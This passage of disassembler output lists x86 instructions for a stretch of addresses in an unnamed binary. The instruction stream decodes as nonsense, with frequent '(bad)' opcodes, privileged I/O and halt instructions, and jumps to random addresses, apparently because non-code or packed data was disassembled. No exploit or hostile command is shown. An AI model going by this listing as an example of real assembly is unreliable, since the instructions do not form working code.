  416478:	cmc    
  416479:	xchg   ecx,eax
  41647a:	pop    ebx
  41647b:	nop
  41647c:	push   ebx
  41647d:	fisubr DWORD PTR [ebx]
  41647f:	dec    edx
  416480:	fidivr DWORD PTR [edi-0x37]
  416483:	pop    ebx
  416484:	cld    
  416485:	imul   ecx,DWORD PTR [ebx-0x28d5a8d5],0xffffffed
  41648c:	adc    esp,ecx
  41648e:	pop    ebp
  41648f:	shl    BYTE PTR [esi-0x60dd8696],cl
  416495:	mov    gs,esp
  416497:	shr    dh,0xdb
  41649a:	dec    esp
  41649b:	sub    DWORD PTR [edi-0x32459cf4],eax
  4164a1:	popf   
  4164a2:	ins    DWORD PTR es:[edi],dx
  4164a3:	inc    ebx
  4164a4:	(bad)  
  4164a6:	shr    DWORD PTR ds:0xca52b649,1
  4164ac:	popa   
  4164ad:	jle    0x41647f
  4164af:	xchg   esi,eax
  4164b0:	or     esi,DWORD PTR [ecx+0x4b]
  4164b3:	daa    
  4164b4:	xor    bh,ah
  4164b6:	jae    0x41650d
  4164b8:	inc    esp
  4164b9:	pop    ebp
  4164ba:	mov    edi,0xeb2bc5d1
  4164bf:	xchg   esp,eax
  4164c0:	xchg   esi,eax
  4164c1:	push   ds
  4164c2:	cld    
  4164c3:	into   
  4164c4:	pusha  
  4164c5:	ror    BYTE PTR [ecx-0x5214c505],1
  4164cb:	xchg   esi,eax
  4164cc:	mov    ?,WORD PTR es:[edi-0x7c]
  4164d0:	test   al,0xef
  4164d2:	(bad)  
  4164d3:	inc    edi
  4164d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164d5:	dec    ebx
  4164d6:	ja     0x4164bb
  4164d8:	inc    edx
  4164d9:	dec    ebx
  4164da:	pusha  
  4164db:	imul   ecx,DWORD PTR [esi+ecx*1-0x13deb25e],0x8423c910
  4164e6:	inc    esp
  4164e7:	out    0x81,eax
  4164e9:	and    al,dh
  4164eb:	jmp    0x92e0d18a
  4164f0:	cmp    ebx,DWORD PTR ds:0x4d70710f
  4164f6:	or     al,0xcf
  4164f8:	jbe    0x4164c5
  4164fa:	xchg   edi,eax
  4164fb:	shl    ebp,1
  4164fd:	mov    al,ds:0xb62a01e1
  416502:	test   al,0x83
  416504:	fwait
  416505:	jmp    0x416524
  416507:	jl     0x4164c4
  416509:	daa    
  41650a:	sbb    dh,BYTE PTR [edx]
  41650c:	xchg   edx,eax
  41650d:	jl     0x416555
  41650f:	pop    esp
  416510:	ficomp WORD PTR [ebx+0x3b4d4e3f]
  416516:	cmp    al,0x45
  416518:	xchg   BYTE PTR ds:0xd4ea76fc,ch
  41651e:	pusha  
  41651f:	inc    ecx
  416520:	xchg   ecx,eax
  416521:	xchg   esp,eax
  416522:	sbb    eax,0xedbb86e9
  416527:	dec    ebp
  416528:	cmp    ecx,DWORD PTR [ecx-0x5a647d2d]
  41652e:	fwait
  41652f:	inc    edx
  416530:	imul   ebx,DWORD PTR [esi],0xffffffc3
  416533:	mov    cs,WORD PTR [edx-0x69]
  416536:	xchg   DWORD PTR [bp+si],esi
  416539:	jge    0x416570
  41653b:	inc    eax
  41653c:	jmp    0x41650b
  41653e:	push   0xac641ab9
  416543:	paddusw mm3,mm5
  416546:	mov    dl,0xba
  416548:	and    BYTE PTR [edi],0x7a
  41654b:	adc    DWORD PTR [esi],esp
  41654d:	scas   al,BYTE PTR es:[edi]
  41654e:	imul   ebx,DWORD PTR [ecx+esi*8],0x5b
  416552:	mov    BYTE PTR [ebp-0x43],dl
  416555:	add    al,0x4
  416557:	xchg   ebp,eax
  416558:	add    al,0xbd
  41655a:	test   eax,0x66390a73
  41655f:	cs int 0xfc
  416562:	rcl    BYTE PTR [edi+eax*4+0x77],0xf8
  416567:	push   es
  416568:	xchg   BYTE PTR [ebp-0x54],dh
  41656b:	enter  0x21c0,0xa9
  41656f:	cli    
  416570:	arpl   WORD PTR [ecx],cx
  416572:	mov    ebx,DWORD PTR [ecx]
  416574:	mov    BYTE PTR [edi+0x70],dl
  416577:	mov    eax,ds:0x51447782
  41657c:	out    dx,al
  41657d:	loope  0x4165e6
  41657f:	or     al,0xc4
  416581:	push   cs
  416582:	arpl   WORD PTR [eax-0x54],di
  416585:	adc    BYTE PTR [ebx],ah
  416587:	das    
  416588:	je     0x4165b2
  41658a:	mov    edx,0xe7f6423c
  41658f:	lds    edi,FWORD PTR [esp-0x40]
  416593:	out    dx,eax
  416594:	lock jmp FWORD PTR [edx+0x4a9b007b]
  41659b:	cmp    ah,BYTE PTR [ecx+eax*2+0x69]
  41659f:	or     edi,edx
  4165a1:	rcl    bl,0x7f
  4165a4:	pop    eax
  4165a5:	jbe    0x4165e5
  4165a7:	test   DWORD PTR [edx+0x44],0xb65a489
  4165ae:	xlat   BYTE PTR ds:[ebx]
  4165af:	into   
  4165b0:	xchg   edx,eax
  4165b1:	test   BYTE PTR [eax],cl
  4165b3:	lock cmp al,0x31
  4165b6:	(bad)  
  4165b7:	or     eax,0x5b9eeb57
  4165bc:	sub    dh,BYTE PTR [ecx+0x2c]
  4165bf:	mov    esp,0x4903b500
  4165c4:	stos   BYTE PTR es:[edi],al
  4165c5:	mov    ds:0x7e1c7454,eax
  4165ca:	pop    esp
  4165cb:	stos   DWORD PTR es:[edi],eax
  4165cc:	cmp    eax,0x92c8dd95
  4165d1:	or     eax,0x79b7999f
  4165d6:	push   esi
  4165d7:	imul   edx,DWORD PTR cs:[edx],0x7c9eed4d
  4165de:	aad    0x99
  4165e0:	sbb    ah,al
  4165e2:	stc    
  4165e3:	mov    ds:0xa7621fcd,al
  4165e8:	je     0x4165c3
  4165ea:	addr16 add al,0xf5
  4165ed:	pop    edx
  4165ee:	xchg   ebp,eax
  4165ef:	int    0xec
  4165f1:	jns    0x41664c
  4165f3:	cmp    esi,DWORD PTR cs:[edi+0x59cd5cef]
  4165fa:	sub    eax,0x7ed86701
  4165ff:	pop    esp
  416600:	push   0xffffffe2
  416602:	aam    0x6
  416604:	dec    ebx
  416605:	sti    
  416606:	jnp    0x41662f
  416608:	mov    ebp,0x6bb637f2
  41660d:	dec    ebp
  41660e:	sub    al,0xe8
  416610:	test   al,0xda
  416612:	inc    eax
  416613:	imul   DWORD PTR [esp+edi*1]
  416616:	jmp    0x77b9c732
  41661b:	(bad)  
  41661c:	int    0x8c
  41661e:	pop    ebp
  41661f:	dec    esi
  416620:	imul   eax,DWORD PTR [ecx-0x1532962],0x730059e2
  41662a:	xor    bl,cl
  41662c:	push   edx
  41662d:	cdq    
  41662e:	inc    edi
  41662f:	call   0x7ca2aa6
  416634:	mov    dh,0x3
  416636:	jle    0x41663b
  416638:	into   
  416639:	ins    DWORD PTR es:[edi],dx
  41663a:	cmpxchg BYTE PTR [esp+ecx*8-0x16],dh
  41663f:	es mov bl,0x8e
  416642:	int3   
  416643:	xchg   edx,eax
  416644:	scas   al,BYTE PTR es:[edi]
  416645:	sub    BYTE PTR [edi+0x2f],0x94
  416649:	dec    eax
  41664a:	fucomp st(6)
  41664c:	call   0x3183:0x17e6dd6d
  416653:	fcomp  DWORD PTR [eax]
  416655:	cmp    al,0x4
  416657:	xchg   BYTE PTR [eax+esi*2-0xd47a301],cl
  41665e:	dec    ebx
  41665f:	ror    DWORD PTR [edx+edi*4+0x26],1
  416663:	mov    esp,edi
  416665:	or     BYTE PTR [esi+0x79],bh
  416668:	lea    ebx,[eax]
  41666a:	pop    ebp
  41666b:	mov    bl,0xa2
  41666d:	cmp    BYTE PTR [ebp-0x4c],ah
  416670:	imul   eax,DWORD PTR [edx-0x38514a64],0x8a6a1388
  41667a:	and    DWORD PTR [eax],0xac8c5a6d
  416680:	and    bh,BYTE PTR [ebp+edx*2+0x16986cc8]
  416687:	sar    DWORD PTR [edx+0x559b37eb],0x61
  41668e:	aas    
  41668f:	push   ecx
  416690:	xchg   edx,eax
  416691:	mov    ah,0x59
  416693:	aas    
  416694:	ficom  DWORD PTR [ebx+0x57]
  416697:	mov    ds:0xb4af1648,al
  41669c:	mov    BYTE PTR [ebx-0x7431d675],ch
  4166a2:	loope  0x41664b
  4166a4:	loop   0x4166c6
  4166a6:	mov    ?,WORD PTR [eax+edx*1+0x59fb4709]
  4166ad:	inc    esp
  4166ae:	das    
  4166af:	jb     0x4166e1
  4166b1:	fs push edx
  4166b3:	xor    BYTE PTR [ecx+eiz*1+0x66],dl
  4166b7:	xchg   ebx,eax
  4166b8:	cdq    
  4166b9:	out    dx,al
  4166ba:	jmp    0x416648
  4166bc:	cs xchg esi,eax
  4166be:	mov    esp,esi
  4166c0:	xchg   esp,eax
  4166c1:	repnz dec ebp
  4166c3:	push   ebx
  4166c4:	adc    ch,BYTE PTR [edi-0x2b]
  4166c7:	repz cmp BYTE PTR [edi-0x6],0x6d
  4166cc:	(bad)  
  4166cd:	clc    
  4166ce:	adc    DWORD PTR [eax+0x6bdb1a2c],eax
  4166d4:	mov    BYTE PTR [eax+0x7df978b7],al
  4166da:	enter  0x24c3,0x80
  4166de:	lahf   
  4166df:	mov    ah,0x6a
  4166e1:	ret    
  4166e2:	ret    
  4166e3:	test   cl,0x93
  4166e6:	add    DWORD PTR ss:0x7f0e6215,eax
  4166ed:	fs or  ch,al
  4166f0:	stos   BYTE PTR es:[edi],al
  4166f1:	std    
  4166f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166f3:	mov    edi,0x4687547a
  4166f8:	fidiv  WORD PTR [esi+0x1c2a782b]
  4166fe:	push   ss
  4166ff:	and    dh,cl
  416701:	mov    ah,0x79
  416703:	jge    0x4166c6
  416705:	imul   esp
  416707:	ss call 0x6879:0x95ad8347
  41670f:	pop    edx
  416710:	lock outs dx,DWORD PTR ds:[esi]
  416712:	scas   al,BYTE PTR es:[edi]
  416713:	das    
  416714:	popf   
  416715:	inc    ebx
  416716:	sbb    ebx,ebp
  416718:	xor    al,0xc9
  41671a:	lds    ebp,FWORD PTR ds:0xcae964de
  416720:	add    BYTE PTR [esi+0x1f],dh
  416723:	pop    ebp
  416724:	aad    0xb3
  416726:	popa   
  416727:	dec    edi
  416728:	dec    ecx
  416729:	hlt    
  41672a:	mov    WORD PTR [esi+ebx*4],ds
  41672d:	pop    edi
  41672e:	cdq    
  41672f:	xchg   ecx,eax
  416730:	xchg   edx,eax
  416731:	sbb    DWORD PTR [eax],edx
  416733:	add    DWORD PTR [ebx],eax
  416735:	push   ebx
  416736:	sbb    eax,0xe12165d3
  41673b:	gs push ss
  41673d:	es std 
  41673f:	push   cs
  416740:	je     0x4166e9
  416742:	mov    WORD PTR [edx-0x7137fc37],fs
  416748:	and    eax,0x950e254d
  41674d:	push   esp
  41674e:	jmp    0x416778
  416750:	mov    edx,0xae6e7cae
  416755:	add    eax,0xdc4d6706
  41675a:	mov    dh,0xc2
  41675c:	inc    edi
  41675d:	jo     0x41671a
  41675f:	pop    ebp
  416760:	inc    esi
  416761:	std    
  416762:	add    ah,al
  416764:	jno    0x416721
  416766:	popa   
  416767:	jo     0x416742
  416769:	mov    eax,ds:0x54af458f
  41676e:	mov    WORD PTR [esi+eiz*4],gs
  416771:	cmp    bh,bl
  416773:	repz enter 0x6744,0xe0
  416778:	add    eax,0x6e3bef19
  41677d:	sbb    ebx,DWORD PTR [edx+0x34]
  416780:	pop    esi
  416781:	adc    BYTE PTR [ebx+0x649c4fbf],bl
  416787:	pop    ds
  416788:	inc    esi
  416789:	cli    
  41678a:	jo     0x4167ac
  41678c:	cmp    DWORD PTR cs:[esi+0x77a82da8],0xedebe3ce
  416797:	dec    eax
  416798:	test   DWORD PTR [edi+eiz*4+0x2c],ebp
  41679c:	gs jb  0x4167be
  41679f:	les    esi,FWORD PTR [edi+0x1d5598cb]
  4167a5:	push   esi
  4167a6:	retf   0xe6b6
  4167a9:	fsubr  DWORD PTR [esi-0x7378b25c]
  4167af:	repnz leave 
  4167b1:	adc    edx,0xd9bbdbf
  4167b7:	mov    ecx,0x81c6d5b8
  4167bc:	scas   al,BYTE PTR es:[edi]
  4167bd:	fist   WORD PTR [esi+0xb]
  4167c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167c1:	stc    
  4167c2:	icebp  
  4167c3:	mov    al,0x95
  4167c5:	cdq    
  4167c6:	fdivr  DWORD PTR [eax-0x655d0a05]
  4167cc:	rol    dl,1
  4167ce:	pusha  
  4167cf:	push   0x34b0de01
  4167d4:	test   eax,0xe64e38d5
  4167d9:	nop
  4167da:	add    DWORD PTR [eax-0x28209288],edi
  4167e0:	std    
  4167e1:	fbstp  TBYTE PTR [esp+edi*8]
  4167e4:	and    cl,bh
  4167e6:	jo     0x4167e3
  4167e8:	xor    bh,BYTE PTR [ecx+0x30]
  4167eb:	fldenv [edi+eiz*2-0x6a67e0d]
  4167f2:	fs fwait
  4167f4:	jle    0x416859
  4167f6:	xor    BYTE PTR [eax-0x74],cl
  4167f9:	dec    ebx
  4167fa:	jl     0x4167da
  4167fc:	sbb    esi,DWORD PTR [edi+edx*1]
  4167ff:	jae    0x41685c
  416801:	cmp    esp,ebp
  416803:	and    al,0xcb
  416805:	xor    al,0x4a
  416807:	mov    ds:0xabb2638f,al
  41680c:	iret   
  41680d:	fdivr  QWORD PTR [esi+0x57]
  416810:	jo     0x41688f
  416812:	imul   edx,DWORD PTR [ecx+0x1c18eec3],0x3e
  416819:	scas   eax,DWORD PTR es:[edi]
  41681a:	push   edi
  41681b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41681c:	aas    
  41681d:	mov    esp,0x49b5e1ba
  416822:	mov    ebp,0x5d8bce86
  416827:	mov    ch,al
  416829:	adc    BYTE PTR [esi+0x5109782c],ch
  41682f:	mov    WORD PTR [ecx],ss
  416831:	fdivrp st(4),st
  416833:	sahf   
  416834:	out    dx,al
  416835:	dec    eax
  416836:	and    ah,ah
  416838:	jmp    0x416861
  41683a:	fwait
  41683b:	je     0x416842
  41683d:	fist   DWORD PTR [edi+0x145fe32f]
  416843:	imul   ebp,DWORD PTR [ebp+0x69],0xb9a5443
  41684a:	pop    esp
  41684b:	mov    ecx,0x62c50463
  416850:	popa   
  416851:	or     eax,DWORD PTR [eax-0x30b3adc7]
  416857:	mov    bh,0x90
  416859:	shl    cl,1
  41685b:	dec    edx
  41685c:	adc    DWORD PTR [edi+0x1],eax
  41685f:	loope  0x41688d
  416861:	or     ebp,ebp
  416863:	xchg   ch,bh
  416865:	out    0xf0,al
  416867:	inc    edi
  416868:	test   al,0x7e
  41686a:	dec    edi
  41686b:	loope  0x41688f
  41686d:	arpl   WORD PTR [eax-0x4a4a8381],bx
  416873:	cld    
  416874:	aam    0x4f
  416876:	push   0x278d37a2
  41687b:	shr    DWORD PTR [edi+0x50],1
  41687e:	inc    edx
  41687f:	outs   dx,BYTE PTR ds:[esi]
  416880:	sti    
  416881:	mov    al,ds:0xef02b8c2
  416886:	nop
  416887:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416888:	dec    esi
  416889:	lods   al,BYTE PTR ds:[esi]
  41688a:	adc    al,0xd5
  41688c:	int    0x26
  41688e:	ins    DWORD PTR es:[edi],dx
  41688f:	out    0xc0,eax
  416891:	scas   eax,DWORD PTR es:[edi]
  416892:	mov    ebp,0xdbac3824
  416897:	push   0x9a59f9e8
  41689c:	(bad)  
  41689d:	jbe    0x41687a
  41689f:	cmp    al,0xab
  4168a1:	mov    bh,0x21
  4168a3:	aaa    
  4168a4:	cmp    esi,esp
  4168a6:	lea    edx,[ecx]
  4168a8:	xor    esp,ecx
  4168aa:	xor    cl,cl
  4168ac:	data16 sbb bl,BYTE PTR [ecx+0x14]
  4168b0:	xchg   esi,eax
  4168b1:	mov    esp,0x4f7ba1cf
  4168b6:	mov    ecx,0x5b5295c
  4168bb:	leave  
  4168bc:	jb     0x416841
  4168be:	jle    0x416906
  4168c0:	dec    edi
  4168c1:	inc    esp
  4168c2:	pop    ss
  4168c3:	push   ecx
  4168c4:	xor    al,0x81
  4168c6:	or     BYTE PTR [esi-0x59f15783],0x11
  4168cd:	mov    dl,0x42
  4168cf:	sbb    dl,BYTE PTR [ebp-0x4]
  4168d2:	jb     0x4168bb
  4168d4:	scas   eax,DWORD PTR es:[edi]
  4168d5:	jo     0x416906
  4168d7:	(bad)  
  4168d8:	hlt    
  4168d9:	mov    ss,WORD PTR [esp+ebx*2-0x245b3e2]
  4168e0:	xchg   ebp,eax
  4168e1:	mov    eax,0x502d551
  4168e6:	jnp    0x4168d8
  4168e8:	loopne 0x4168ed
  4168ea:	sar    BYTE PTR [esi+0x2d320d92],cl
  4168f0:	out    0xed,eax
  4168f2:	enter  0x9b90,0x86
  4168f6:	call   0x7619:0xc89922d
  4168fd:	call   0x62d71412
  416902:	(bad)  
  416903:	out    dx,al
  416904:	xor    eax,0xa274ac9d
  416909:	dec    esp
  41690a:	test   BYTE PTR [esi+0x32],ch
  41690d:	lahf   
  41690e:	mov    ds:0xe1cd434e,al
  416913:	mov    bh,0x67
  416915:	mov    ebp,ebx
  416917:	mov    eax,0xf8d3204b
  41691c:	inc    esp
  41691d:	mov    ch,bh
  41691f:	push   eax
  416920:	stos   DWORD PTR es:[edi],eax
  416921:	test   DWORD PTR [ecx+ebp*8],eax
  416924:	jmp    0x4168ae
  416926:	xor    al,0xa3
  416928:	ds dec ebp
  41692a:	xor    al,0x8d
  41692c:	xchg   ebx,eax
  41692d:	rcr    DWORD PTR [esi+0x64],cl
  416930:	mov    al,ds:0x66b2f793
  416935:	stos   DWORD PTR es:[edi],eax
  416936:	xor    dh,BYTE PTR [eax-0x12]
  416939:	cmp    BYTE PTR [eax-0x3c],dh
  41693c:	sbb    al,0xc5
  41693e:	dec    ebx
  41693f:	adc    eax,DWORD PTR ds:0x47e19ecd
  416945:	(bad)  
  416946:	cld    
  416947:	mov    ds:0x7caa23c4,eax
  41694c:	xor    ah,al
  41694e:	ret    
  41694f:	xor    DWORD PTR [ebp+0x69017be6],esp
  416955:	cmp    BYTE PTR [ebx+ebp*4+0x7a609718],0xc6
  41695d:	mov    ebp,0x6a9bb3a6
  416962:	mov    ebx,0xeee7c3c8
  416967:	inc    ebp
  416968:	xor    DWORD PTR [eax],esi
  41696a:	inc    ebp
  41696b:	add    bh,BYTE PTR [ebx+0x7fd53a08]
  416971:	push   eax
  416972:	into   
  416973:	in     eax,dx
  416974:	rol    DWORD PTR [esi],0x8d
  416977:	(bad)  
  416978:	out    dx,eax
  416979:	or     eax,0x3240c9a3
  41697e:	jo     0x41694d
  416980:	call   0xfcb7:0xcd86600e
  416987:	inc    eax
  416988:	and    DWORD PTR [ebp-0x60],ebp
  41698b:	pop    edx
  41698c:	mov    dh,al
  41698e:	(bad)  
  41698f:	fwait
  416990:	push   esp
  416991:	imul   esi,DWORD PTR [ebx],0x1e6c5bef
  416997:	ret    0x98ec
  41699a:	xchg   esp,eax
  41699b:	or     BYTE PTR [edx-0xae739b0],ch
  4169a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169a2:	pop    edx
  4169a3:	fldenv [ebx]
  4169a5:	rcl    dl,cl
  4169a7:	data16 fst QWORD PTR [ebp-0x44]
  4169ab:	lods   eax,DWORD PTR ds:[esi]
  4169ac:	adc    ecx,DWORD PTR [edi+0x49f502d5]
  4169b2:	or     bh,dh
  4169b4:	and    ah,BYTE PTR [ebx+0x38ff245f]
  4169ba:	add    eax,0x8ec20fdb
  4169bf:	dec    edx
  4169c0:	mov    esi,0x18aa0782
  4169c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169c6:	add    DWORD PTR [ecx+0x50],edi
  4169c9:	fisubr WORD PTR [edi-0x52835cd]
  4169cf:	fcomp  st(3)
  4169d1:	fdiv   QWORD PTR [eax-0xf71fca4]
  4169d7:	in     al,dx
  4169d8:	loopne 0x4169ce
  4169da:	(bad)  
  4169db:	cwde   
  4169dc:	nop
  4169dd:	imul   esp,DWORD PTR [eax+edx*4-0x39e7efc9],0x49
  4169e5:	fild   DWORD PTR [ecx+0x2b]
  4169e8:	cmp    al,0xd4
  4169ea:	icebp  
  4169eb:	out    0x1a,al
  4169ed:	std    
  4169ee:	and    al,0xf4
  4169f0:	call   0x92ff:0xb67de70
  4169f7:	jmp    0x416a44
  4169f9:	loop   0x4169d0
  4169fb:	test   BYTE PTR [edx],0x7a
  4169fe:	mov    eax,0xb30d073
  416a03:	or     al,0xfc
  416a05:	rcr    BYTE PTR [edx],1
  416a07:	(bad)  
  416a08:	fisub  WORD PTR [ecx-0x3a]
  416a0b:	xor    esp,edi
  416a0d:	mov    eax,0x6c37082c
  416a12:	and    dl,BYTE PTR [esp+esi*1]
  416a15:	pushf  
  416a16:	pusha  
  416a17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a18:	mov    edx,0xb4434fe0
  416a1d:	(bad)  
  416a1f:	cmc    
  416a20:	frndint 
  416a22:	mov    bh,0xe3
  416a24:	push   0xfffffff6
  416a26:	loope  0x416a30
  416a28:	pop    esi
  416a29:	mov    cl,0x61
  416a2b:	fld    st(3)
  416a2d:	out    dx,al
  416a2e:	addr16 mov eax,ds:0x9a47
  416a32:	and    al,dl
  416a34:	(bad)  [edx+0x30b2c34f]
  416a3a:	cmp    ch,bl
  416a3c:	lds    ecx,FWORD PTR [edi+0x4d]
  416a3f:	jbe    0x4169ec
  416a41:	jmp    0xdb512ef4
  416a46:	pushf  
  416a47:	add    esp,DWORD PTR [eax+0xe33ed2b]
  416a4d:	mov    esp,0xa80183ff
  416a52:	cmp    al,0xa6
  416a54:	push   esi
  416a55:	mov    ecx,0x5c8658c2
  416a5a:	arpl   WORD PTR [esi],cx
  416a5c:	in     al,dx
  416a5d:	mov    al,0xe4
  416a5f:	mov    eax,0xd0862dc4
  416a64:	sub    al,0x54
  416a66:	sbb    al,0xf7
  416a68:	das    
  416a69:	mov    eax,ds:0xf502f4bb
  416a6e:	repz push ebx
  416a70:	sub    ecx,eax
  416a72:	mov    ebx,0xf898ab60
  416a77:	std    
  416a78:	adc    edi,DWORD PTR [edi-0x5d3bfda5]
  416a7e:	gs (bad) 
  416a80:	in     eax,0x57
  416a82:	push   es
  416a83:	mov    cl,0x51
  416a85:	jne    0x416b02
  416a87:	add    esi,eax
  416a89:	jno    0x416ab6
  416a8b:	push   cs
  416a8c:	mov    edi,DWORD PTR [esi+0x12]
  416a8f:	ins    DWORD PTR es:[edi],dx
  416a90:	sbb    BYTE PTR [ebx+0x6a50d41f],ch
  416a96:	cmc    
  416a97:	mov    ds:0x83764334,eax
  416a9c:	popf   
  416a9d:	loopne 0x416a46
  416a9f:	ja     0x416afc
  416aa1:	add    BYTE PTR [edx-0x464ba2c1],al
  416aa7:	dec    edx
  416aa8:	adc    DWORD PTR cs:[edi+0x47bb2b80],ecx
  416aaf:	xor    eax,0x73837af6
  416ab4:	rol    dl,1
  416ab6:	pop    ebx
  416ab7:	aam    0xf7
  416ab9:	lds    edx,FWORD PTR [esi-0x5e61b60a]
  416abf:	sar    DWORD PTR [eax+0x42],1
  416ac2:	iret   
  416ac3:	adc    ecx,ecx
  416ac5:	push   edi
  416ac6:	dec    ecx
  416ac7:	les    ebp,FWORD PTR [ebp+edi*2+0x327905a2]
  416ace:	xor    al,0x6c
  416ad0:	mov    dl,0x7b
  416ad2:	aas    
  416ad3:	xchg   ecx,eax
  416ad4:	inc    ebx
  416ad5:	push   ecx
  416ad6:	push   esp
  416ad7:	inc    esp
  416ad8:	fmul   st(7),st
  416ada:	test   DWORD PTR [esi+0x3511b74e],edi
  416ae0:	repnz pusha 
  416ae2:	and    dl,BYTE PTR [esi]
  416ae4:	and    esp,esi
  416ae6:	mov    al,ds:0x6442c0b8
  416aeb:	cmp    DWORD PTR [ebx],edx
  416aed:	arpl   WORD PTR [edi+eiz*4+0x77da3da5],si
  416af4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416af5:	lds    esp,FWORD PTR [edx+0x34]
  416af8:	xchg   BYTE PTR [edx+0x7462da7],dl
  416afe:	inc    ebp
  416aff:	js     0x416b08
  416b01:	hlt    
  416b02:	sub    ecx,DWORD PTR [edx-0x3f]
  416b05:	xchg   edx,eax
  416b06:	dec    ebx
  416b07:	mov    dl,0x6f
  416b09:	mov    cl,0x77
  416b0b:	dec    esp
  416b0c:	adc    BYTE PTR [ecx-0x4],bh
  416b0f:	sbb    BYTE PTR [ecx+0x4b],bl
  416b12:	test   BYTE PTR [ebp+0x71],ch
  416b15:	and    al,BYTE PTR ds:0xcc4eef1a
  416b1b:	cld    
  416b1c:	mov    ds:0x5bccba1e,al
  416b21:	dec    ebx
  416b22:	popa   
  416b23:	mov    ah,0x28
  416b25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b26:	sbb    DWORD PTR [edi-0x69],ebp
  416b29:	das    
  416b2a:	cwde   
  416b2b:	punpckhwd mm3,QWORD PTR [edx-0x6cfd3f24]
  416b32:	or     esi,DWORD PTR [eax+edx*8+0x1b1039b6]
  416b39:	loope  0x416b06
  416b3b:	xchg   esi,eax
  416b3c:	sub    BYTE PTR [eax+0x10],cl
  416b3f:	jmp    0x699c:0x5d6f5d0c
  416b46:	mov    ch,BYTE PTR [eax-0x5b]
  416b49:	(bad)  
  416b4a:	xor    esi,ebx
  416b4c:	and    al,0x88
  416b4e:	out    dx,eax
  416b4f:	mov    ds,esp
  416b51:	adc    eax,0x5e222aee
  416b56:	mov    bl,0x39
  416b58:	jmp    0x6d5e:0xaa96f6d0
  416b5f:	push   esp
  416b60:	repnz mov bh,0x97
  416b63:	js     0xbd59581f
  416b69:	inc    ebx
  416b6a:	iret   
  416b6b:	aaa    
  416b6c:	pop    ebp
  416b6d:	lods   eax,DWORD PTR ds:[esi]
  416b6e:	jne    0x416b23
  416b70:	inc    esi
  416b71:	inc    edi
  416b72:	mov    esp,0x82bb8af0
  416b77:	stos   BYTE PTR es:[edi],al
  416b78:	les    eax,FWORD PTR [edx+0x5f]
  416b7b:	mov    esp,0x510515a3
  416b80:	not    edx
  416b82:	push   ss
  416b83:	mov    esp,0xa8fb1aca
  416b88:	mov    ecx,0xe25ffea5
  416b8d:	adc    DWORD PTR [eax+0x33],ecx
  416b90:	lock scas al,BYTE PTR es:[edi]
  416b92:	mov    ah,0x0
  416b94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b95:	mov    cl,0x1f
  416b97:	popf   
  416b98:	push   edi
  416b99:	adc    DWORD PTR [ebx-0x3f],ebp
  416b9c:	mov    al,0xb7
  416b9e:	and    al,0x60
  416ba0:	lahf   
  416ba1:	mov    cl,0xcb
  416ba3:	fwait
  416ba4:	stos   BYTE PTR es:[edi],al
  416ba5:	inc    edi
  416ba6:	push   eax
  416ba7:	push   es
  416ba8:	popa   
  416ba9:	push   esp
  416baa:	cmp    eax,DWORD PTR ss:[esi]
  416bad:	aas    
  416bae:	or     DWORD PTR [edx-0x54d1ef32],ebp
  416bb4:	shr    ah,1
  416bb6:	idiv   DWORD PTR [ebp+esi*4+0x7d]
  416bba:	cld    
  416bbb:	and    DWORD PTR ds:0x9f47ffe3,esp
  416bc1:	gs mov ebx,0x45f7a0fa
  416bc7:	test   BYTE PTR [eax+ecx*8+0x288432f0],0x6d
  416bcf:	add    DWORD PTR [eax+0x7a],esp
  416bd2:	out    dx,eax
  416bd3:	cli    
  416bd4:	mov    ebx,0x1ffe0451
  416bd9:	retf   0x45cf
  416bdc:	fdiv   DWORD PTR [esi-0xf4303b0]
  416be2:	pop    ecx
  416be3:	jle    0x416bb2
  416be5:	xchg   edi,eax
  416be6:	inc    edi
  416be7:	push   ss
  416be8:	mov    ch,0x3b
  416bea:	fisubr DWORD PTR [ebx]
  416bec:	(bad)  
  416bed:	stc    
  416bee:	iret   
  416bef:	and    eax,0x5eb3b101
  416bf4:	mov    cl,0xf9
  416bf6:	adc    al,0xd3
  416bf8:	cld    
  416bf9:	in     ax,0xef
  416bfc:	test   al,0xff
  416bfe:	push   es
  416bff:	(bad)  
  416c00:	sbb    dh,BYTE PTR [eax+0x33]
  416c03:	repnz xchg ebp,eax
  416c05:	mov    ebx,0x939e2cc9
  416c0a:	jl     0x416c35
  416c0c:	inc    ebp
  416c0d:	(bad)  
  416c0e:	lds    ecx,FWORD PTR [ebx-0x4097d635]
  416c14:	lahf   
  416c15:	nop
  416c16:	daa    
  416c17:	nop
  416c18:	retf   
  416c19:	adc    cl,BYTE PTR ds:0x5b6d7d32
  416c1f:	xor    al,0x26
  416c21:	(bad)  
  416c23:	or     eax,0xb9055d90
  416c28:	push   0xffffff9c
  416c2a:	dec    esp
  416c2b:	mov    BYTE PTR [ebx+edi*4-0x36],dh
  416c2f:	rcr    DWORD PTR [ebp+0x78a5e270],1
  416c35:	fstp   DWORD PTR [ecx+ecx*2]
  416c38:	jmp    0xc671:0xb37194a5
  416c3f:	inc    esp
  416c40:	test   esp,esp
  416c42:	sbb    BYTE PTR [esp+ebp*4+0x58],dh
  416c46:	mov    edi,0x101c9e5e
  416c4b:	cmp    bl,BYTE PTR [ecx+0x8]
  416c4e:	mov    eax,DWORD PTR [ebx+0x23]
  416c51:	test   BYTE PTR [ebx],bl
  416c53:	xlat   BYTE PTR ds:[ebx]
  416c54:	inc    edi
  416c55:	hlt    
  416c56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c57:	imul   ebx,ecx,0xffffffee
  416c5a:	fnstsw WORD PTR [edx]
  416c5c:	ror    BYTE PTR [esi+0x1c],0x2b
  416c60:	sbb    eax,0x2519d38
  416c65:	cld    
  416c66:	sub    dh,al
  416c68:	mov    cl,0xeb
  416c6a:	dec    ebp
  416c6b:	xchg   edx,eax
  416c6c:	jb     0x416cc9
  416c6e:	and    al,0x79
